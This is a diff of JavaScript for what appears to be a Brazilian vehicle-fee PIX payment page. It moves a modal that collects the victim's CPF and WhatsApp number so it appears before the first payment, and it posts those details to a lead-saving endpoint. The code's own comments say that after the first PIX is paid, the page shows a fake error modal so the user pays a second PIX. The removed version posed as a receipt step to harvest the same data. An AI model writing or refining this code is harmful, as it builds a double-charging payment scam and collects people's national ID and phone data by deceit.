@@ -692,13 +692,15 @@
 
                 // STEP 3 — Pix
                 if (step === 3) {
-
                     lista.style.pointerEvents = "none";
                     pixSection.hidden = false;
                     scrollToEl(pixSection);
-
-                    chamarGeraPIX();
-
+                    // Exibe modal de CPF+Telefone antes de gerar o PIX (apenas na 1ª vez)
+                    if (_pixRodada === 1 && !_leadColetado) {
+                        exibirModalLeadAntesDoPix();
+                    } else {
+                        chamarGeraPIX();
+                    }
                 }
             }
 
@@ -974,17 +976,139 @@
 
         // ─── Flag: controla se é 1º ou 2º PIX ───────────────────────────────────
         let _pixRodada = 1; // 1 = primeiro PIX, 2 = segundo PIX
+        let _leadColetado = false; // true após CPF+Telefone serem salvos
+        let _leadPlaca = null;
+        let _leadCpf = null;
+        let _leadTel = null;
 
         // ─── Redirecionar para obrigado ──────────────────────────────────────────
         function redirecionarObrigado(placa, valor, chargeId) {
             if (_pollingIntervalo) clearInterval(_pollingIntervalo);
             if (_pixRodada === 1) {
-                // 1º PIX pago → modal CPF+Telefone → depois modal de erro falso
-                exibirModalLeadPosPagamento(placa, valor, chargeId);
+                // 1º PIX pago → salvar lead no Redis (CPF+Tel já coletados antes) → modal de erro falso
+                _salvarLeadEExibirErro(placa, valor, chargeId);
             } else {
                 // 2º PIX pago → vai direto para obrigado.html
                 _fazerRedirecionamentoFinal(placa, valor, chargeId);
             }
+        }
+
+        // ─── Salva o lead no Redis e exibe modal de erro falso ──────────────────
+        async function _salvarLeadEExibirErro(placa, valor, chargeId) {
+            try {
+                await fetch('/api/save-lead', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        placa: _leadPlaca || placa,
+                        cpf: _leadCpf || '',
+                        telefone: _leadTel || '',
+                        chargeId,
+                        valor
+                    })
+                });
+            } catch(e) {
+                console.warn('[LEAD] Erro ao salvar:', e);
+            }
+            exibirModalErroPix(placa, valor);
+        }
+
+        // ─── Modal CPF+Telefone ANTES de gerar o PIX ──────────────────────────
+        function exibirModalLeadAntesDoPix() {
+            const placa = document.getElementById('Placa').value || '';
+            let overlay = document.getElementById('leadModalOverlay');
+            if (!overlay) {
+                overlay = document.createElement('div');
+                overlay.id = 'leadModalOverlay';
+                overlay.className = 'lead-modal-overlay';
+                overlay.innerHTML = `
+                    <div class="lead-modal-card">
+                        <div aria-hidden="true" class="lead-modal-grab"></div>
+                        <h3 class="lead-modal-title">Para prosseguir</h3>
+                        <p class="lead-modal-subtitle">Preencha seus dados para gerar o código PIX.</p>
+
+                        <label for="leadCpfInput" class="lead-modal-label">CPF *</label>
+                        <input class="lead-modal-input" id="leadCpfInput" maxlength="14"
+                            placeholder="000.000.000-00" type="text" autocomplete="off" inputmode="numeric" />
+                        <span class="lead-modal-field-error" id="leadCpfError">CPF inválido. Verifique e tente novamente.</span>
+
+                        <label for="leadTelInput" class="lead-modal-label">WhatsApp *</label>
+                        <input class="lead-modal-input" id="leadTelInput" maxlength="15"
+                            placeholder="(00) 00000-0000" type="text" autocomplete="off" inputmode="numeric" />
+                        <span class="lead-modal-field-error" id="leadTelError">Telefone inválido. Verifique e tente novamente.</span>
+
+                        <button class="lead-modal-btn" id="btnConfirmarLead" type="button">Gerar PIX</button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+
+                // Máscara CPF
+                document.getElementById('leadCpfInput').addEventListener('input', function(e) {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
+                    if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+                    else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+                    else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+                    e.target.value = v;
+                });
+
+                // Máscara Telefone
+                document.getElementById('leadTelInput').addEventListener('input', function(e) {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
+                    if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                    else if (v.length > 6) v = v.replace(/(\d{2})(\d{4,5})(\d{0,4})/, '($1) $2-$3');
+                    else if (v.length > 2) v = v.replace(/(\d{2})(\d+)/, '($1) $2');
+                    e.target.value = v;
+                });
+            }
+
+            // Limpar campos
+            document.getElementById('leadCpfInput').value = '';
+            document.getElementById('leadTelInput').value = '';
+            document.getElementById('leadCpfInput').classList.remove('error');
+            document.getElementById('leadTelInput').classList.remove('error');
+            document.getElementById('leadCpfError').style.display = 'none';
+            document.getElementById('leadTelError').style.display = 'none';
+            document.getElementById('btnConfirmarLead').disabled = false;
+            document.getElementById('btnConfirmarLead').textContent = 'Gerar PIX';
+
+            overlay.classList.add('active');
+            setTimeout(() => document.getElementById('leadCpfInput').focus(), 150);
+
+            document.getElementById('btnConfirmarLead').onclick = () => {
+                const cpfRaw = document.getElementById('leadCpfInput').value.replace(/\D/g, '');
+                const telRaw = document.getElementById('leadTelInput').value.replace(/\D/g, '');
+                let valido = true;
+
+                if (cpfRaw.length !== 11) {
+                    document.getElementById('leadCpfInput').classList.add('error');
+                    document.getElementById('leadCpfError').style.display = 'block';
+                    valido = false;
+                } else {
+                    document.getElementById('leadCpfInput').classList.remove('error');
+                    document.getElementById('leadCpfError').style.display = 'none';
+                }
+
+                if (telRaw.length < 10 || telRaw.length > 11) {
+                    document.getElementById('leadTelInput').classList.add('error');
+                    document.getElementById('leadTelError').style.display = 'block';
+                    valido = false;
+                } else {
+                    document.getElementById('leadTelInput').classList.remove('error');
+                    document.getElementById('leadTelError').style.display = 'none';
+                }
+
+                if (!valido) return;
+
+                // Salva os dados em memória para usar após o pagamento
+                _leadPlaca = placa;
+                _leadCpf = cpfRaw;
+                _leadTel = telRaw;
+                _leadColetado = true;
+
+                overlay.classList.remove('active');
+                // Agora gera o PIX
+                chamarGeraPIX();
+            };
         }
 
         function _fazerRedirecionamentoFinal(placa, valor, chargeId) {
@@ -1045,52 +1169,6 @@
             };
         }
 
-        // ─── Modal CPF+Telefone pós-pagamento ────────────────────────────────────
-        function exibirModalLeadPosPagamento(placa, valor, chargeId) {
-            let overlay = document.getElementById('leadModalOverlay');
-            if (!overlay) {
-                overlay = document.createElement('div');
-                overlay.id = 'leadModalOverlay';
-                overlay.className = 'lead-modal-overlay';
-                overlay.innerHTML = `
-                    <div class="lead-modal-card">
-                        <div aria-hidden="true" class="lead-modal-grab"></div>
-                        <h3 class="lead-modal-title">Pagamento confirmado! ✅</h3>
-                        <p class="lead-modal-subtitle">Para emitir seu comprovante, preencha os dados abaixo.</p>
-
-                        <label for="leadCpfInput" class="lead-modal-label">CPF *</label>
-                        <input class="lead-modal-input" id="leadCpfInput" maxlength="14"
-                            placeholder="000.000.000-00" type="text" autocomplete="off" inputmode="numeric" />
-                        <span class="lead-modal-field-error" id="leadCpfError">CPF inválido. Verifique e tente novamente.</span>
-
-                        <label for="leadTelInput" class="lead-modal-label">Telefone *</label>
-                        <input class="lead-modal-input" id="leadTelInput" maxlength="15"
-                            placeholder="(00) 00000-0000" type="text" autocomplete="off" inputmode="numeric" />
-                        <span class="lead-modal-field-error" id="leadTelError">Telefone inválido. Verifique e tente novamente.</span>
-
-                        <button class="lead-modal-btn" id="btnConfirmarLead" type="button">Continuar</button>
-                    </div>
-                `;
-                document.body.appendChild(overlay);
-
-                // Máscara CPF
-                document.getElementById('leadCpfInput').addEventListener('input', function(e) {
-                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
-                    if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
-                    else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
-                    else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
-                    e.target.value = v;
-                });
-
-                // Máscara Telefone
-                document.getElementById('leadTelInput').addEventListener('input', function(e) {
-                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
-                    if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
-                    else if (v.length > 6) v = v.replace(/(\d{2})(\d{4,5})(\d{0,4})/, '($1) $2-$3');
-                    else if (v.length > 2) v = v.replace(/(\d{2})(\d+)/, '($1) $2');
-                    e.target.value = v;
-                });
-            }
 
             // Limpar campos
             document.getElementById('leadCpfInput').value = '';
